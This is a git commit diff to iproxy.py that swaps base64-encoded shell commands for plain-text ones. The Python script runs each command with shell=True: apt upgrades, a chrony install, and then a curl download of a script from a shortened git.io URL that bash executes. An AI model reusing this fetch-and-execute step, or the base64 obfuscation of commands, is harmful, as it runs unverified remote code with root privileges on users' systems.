9298e31ea0faa287362db2af4bf614a5609b3444
PARSICO <39967013+parsico@users.noreply.github.com>
2024-05-18 11:57:45 +0000

    Update iproxy.py

--- iproxy.py
+++ iproxy.py
@@ -1,19 +1,17 @@
 import subprocess
-import base64
 
 def run_commands():
-    encoded_commands = [
-        "YXB0IHVwZGF0ZQ==",
-        "YXB0IHVwZ3JhZGUgLXk=",
-        "c3VkbyBhcHQtZ2V0IGluc3RhbGwgY2hyb255",
-        "c3VkbyBzeXN0ZW1jdGwgc3RhcnQgY2hyb255",
-        "c3VkbyBzeXN0ZW1jdGwgaW5zdGFsbCBjaHJvbnk=",
-        "Y3VybCAtTCAtbyBtdHBfaW5zdGFsbC5zaCBodHRwczovL2dpdC5pby9majVydQ==",
-        "YmFzaCBtdHBfaW5zdGFsbC5zaA=="
+    commands = [
+        "sudo apt update",
+        "sudo apt upgrade -y",
+        "sudo apt-get install chrony -y",
+        "sudo systemctl start chrony",
+        "sudo systemctl enable chrony",
+        "curl -L -o mtp_install.sh https://git.io/fj5ru",
+        "bash mtp_install.sh"
     ]
-
-    for encoded_command in encoded_commands:
-        command = base64.b64decode(encoded_command).decode('utf-8')
+    
+    for command in commands:
         try:
             print(f"Running: {command}")
             subprocess.run(command, check=True, shell=True)
